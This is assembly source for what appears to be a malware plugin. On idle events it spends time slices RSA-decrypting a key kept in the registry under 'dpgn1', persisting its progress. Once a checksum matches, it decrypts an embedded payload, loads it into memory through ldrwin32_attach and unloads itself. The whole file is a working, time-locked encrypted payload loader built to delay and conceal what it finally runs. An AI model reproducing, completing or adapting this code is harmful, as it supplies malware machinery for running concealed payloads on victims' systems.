
; - temporary DPGN's hash is stored in registry
; - limit per-event time usage for CYCLE_TIME

CYCLE_TIME              equ     <5*60*1000>  ; [ms]      ==5 min

MAXKEY                  equ     4096/2

include                 ..\..\INCLUDE\consts.inc
include                 ..\MAIN\main.inc

                        extern  modexp:PROC
                        extern  ldrwin32_attach:PROC

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

dpgn_complete           db      0

reg_subkey              db      'dpgn1',0

include                 DATA\dpgndata.inc

hKey                    dd      ?
time0                   dd      ?

rsa_y                   db      MAXKEY/8 dup (?)
rsa_t1                  db      MAXKEY/8 dup (?)
rsa_t2                  db      2*MAXKEY/8 dup (?)

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        ;;
;                       cmp     eax, 11111111h
;                       je      __main
                        ;;

                        cmp     eax, EV_MAIN_IDLE
                        je      __main

__return_0:             xor     eax, eax
                        retn

__main:                 xor     eax, eax        ; return code
                        pusha
                        cld

                        cmp     dpgn_complete, 0
                        jne     __quit

                        push    offset hKey
                        push    026971DBAh      ; crc32('dpgn1')
                        callW   createkeyV
                        or      eax, eax
                        jnz     __quit

                        push    offset dpgn_keysize
                        push    offset dpgn_rsa_x
                        push    0
                        push    0
                        push    offset reg_subkey
                        push    hKey
                        callW   queryvalueex
                        or      eax, eax
                        jnz     __firsttime

                        ; complete?
                        mov     ecx, dpgn_rsa_x.dword ptr 0
                        or      ecx, dpgn_rsa_x.dword ptr 4
                        jz      __alredy
__cont1:
                        mov     [esp].popa_eax, 1       ; return "handled"

                        callW   gettime
                        mov     time0, eax

__cycle:

; þ perform 1 dpgn iteration

                        ; xorcrypt
                        mov     ecx, dpgn_keylen
                        lea     esi, dpgn_rsa_x
                        call    xorcrypt

                        ; rsa-decrypt
                        push    offset rsa_t2
                        push    offset rsa_t1
                        push    offset dpgn_rsa_m    ; modulus
                        push    offset dpgn_rsa_d    ; exp
                        push    offset dpgn_rsa_x    ; in
                        push    offset rsa_y         ; out
                        push    dpgn_keylen
                        call    modexp
                        add     esp, 7*4

                        lea     esi, rsa_y
                        lea     edi, dpgn_rsa_x
                        mov     ecx, dpgn_keysize
                        rep     movsb

; check if complete
                        lea     esi, dpgn_rsa_x
                        mov     ecx, dpgn_keylen
                        call    calc_hash

                        cmp     eax, dpgn_checksum
                        je      __success

                        callW   gettime
                        sub     eax, time0

                        cmp     eax, CYCLE_TIME
                        jb      __cycle

__exit:                 call    __save

                        push    hKey
                        callW   closekey

__quit:                 popa
                        retn

__firsttime:            call    __save

                        jmp     __cont1

__success:
                        lea     esi, dpgn_data
                        mov     ecx, dpgn_datasize
                        lea     edi, dpgn_rsa_x
                        mov     ebx, dpgn_keysize
                        call    decr_data

                        push    dpgn_datasize
                        push    offset dpgn_data
                        call    ldrwin32_attach
                        add     esp, 8

                        ; complete!
                        mov     dpgn_rsa_x.dword ptr 0, 0
                        mov     dpgn_rsa_x.dword ptr 4, 0
__alredy:
                        mov     dpgn_complete, 1

                        callW   ldrwin32_detach_me

                        jmp     __exit

__save:                 push    dpgn_keysize
                        push    offset dpgn_rsa_x
                        push    REG_BINARY
                        push    0
                        push    offset reg_subkey
                        push    hKey
                        callW   setvalueex

                        retn

include                 dpgncrpt.inc

                        end
